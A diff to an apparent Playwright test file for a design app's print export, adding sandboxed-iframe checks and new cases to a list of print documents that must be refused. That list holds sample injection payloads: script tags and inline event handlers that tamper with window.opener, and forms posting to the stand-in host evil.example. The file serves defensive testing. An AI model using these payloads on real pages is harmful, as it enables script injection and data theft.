@@ -24,7 +24,7 @@ import { test, expect } from './base.js'
 import { go, watch, signIn } from './helpers.js'
 import { DEFAULT_DESIGN } from '../../src/data/designDefaults.js'
 import { chooseFormat, exportPanel, primaryButton, dockStatus, dockError } from './export-rows.js'
-import { mockThemeApi, cleanHtml, tinyZip } from './export-theme-mock.js'
+import { mockThemeApi, cleanHtml, tinyZip, printedDoc, printedCount } from './export-theme-mock.js'
 import { MOTION_SETTINGS, MOTION_WIDTHS, motionState, chooseThemeWithKeys } from './export-reduced-motion.js'
 
 const ROUTE = '/projects/harbour/export'
@@ -504,8 +504,8 @@ test.describe('what is asked for and what is saved', () => {
     const panel = await open(page, { plan: 'free', file: 'guidelines' })
     await pick(panel, 'Label')
     const [popup] = await Promise.all([context.waitForEvent('page'), primaryButton(panel).click()])
-    await expect(popup.locator('#printed-doc')).toHaveText('Harbour brand guidelines')
-    await expect.poll(() => popup.evaluate(() => window.__printed)).toBe(1)
+    await expect(printedDoc(popup).locator('#printed-doc')).toHaveText('Harbour brand guidelines')
+    await expect.poll(() => printedCount(popup)).toBe(1)
     expect(calls).toHaveLength(1)
     expect(calls[0].body).toMatchObject({ theme: '25-label', row: 'slides', format: 'pdf', projectName: 'Harbour' })
   })
@@ -521,9 +521,13 @@ test.describe('what is asked for and what is saved', () => {
       await pick(panel, 'Broadsheet')
       await expect(panel.locator('.xd-man-row[aria-current="true"] .xd-man-n'), 'a print row lists no file name').toHaveText('Print document')
       const [popup] = await Promise.all([context.waitForEvent('page'), primaryButton(panel).click()])
-      await expect(popup.locator('#printed-doc')).toHaveText('Harbour brand book')
-      await expect.poll(() => popup.evaluate(() => window.__printed), 'print() is called once the document is in').toBe(1)
-      expect(await popup.locator('script').count(), 'the printed document carries no script').toBe(0)
+      await expect(printedDoc(popup).locator('#printed-doc')).toHaveText('Harbour brand book')
+      await expect.poll(() => printedCount(popup), 'print() is called once the document is in').toBe(1)
+      expect(await printedDoc(popup).locator('script').count(), 'the printed document carries no script').toBe(0)
+      expect(await popup.locator('script').count(), 'neither does the shell around it').toBe(0)
+      const sandbox = await popup.locator('iframe').getAttribute('sandbox')
+      expect(sandbox, 'the document sits in a sandboxed iframe').toBeTruthy()
+      expect(sandbox.split(/\s+/), 'and the sandbox never allows scripts').not.toContain('allow-scripts')
       expect(calls[0].body).toMatchObject({ theme: '03-broadsheet', row: FILES[file].row, format: 'pdf' })
       expect(downloads).toBe(0)
       expect(await page.evaluate(() => window.__pwned), 'nothing in the document ran').toBeUndefined()
@@ -538,6 +542,8 @@ test.describe('a print document that is not the script-free one is refused', () 
   const refused = [
     ['a script element', `<!doctype html><html><head>${CSP}</head><body><script>window.opener.__pwned = 1</script>Sample</body></html>`],
     ['a script element in capitals with attributes', `<!doctype html><html><head>${CSP}</head><body><SCRIPT type="text/javascript">window.opener.__pwned = 1</SCRIPT></body></html>`],
+    ['a form element', `<!doctype html><html><head>${CSP}</head><body><form action="https://evil.example/"><input name="a"></form>Sample</body></html>`],
+    ['a form element in capitals with a newline after the name', `<!doctype html><html><head>${CSP}</head><body><FORM\naction="https://evil.example/"></FORM></body></html>`],
     ['an inline event handler', `<!doctype html><html><head>${CSP}</head><body><img src="x" onerror="window.opener.__pwned = 1"></body></html>`],
     ['an inline handler after a newline', `<!doctype html><html><head>${CSP}</head><body><a\nonclick="window.opener.__pwned = 1">x</a></body></html>`],
     ['no Content-Security-Policy meta', '<!doctype html><html><head><title>x</title></head><body>Sample</body></html>'],
@@ -580,7 +586,7 @@ test.describe('a print document that is not the script-free one is refused', () 
     await mockThemeApi(page, () => ({ html: cleanHtml('Control') }))
     const panel = await open(page, { plan: 'pro', file: 'book' })
     const [popup] = await Promise.all([context.waitForEvent('page'), primaryButton(panel).click()])
-    await expect(popup.locator('#printed-doc')).toHaveText('Control')
+    await expect(printedDoc(popup).locator('#printed-doc')).toHaveText('Control')
     await expect(dockError(panel)).toHaveCount(0)
   })
 })
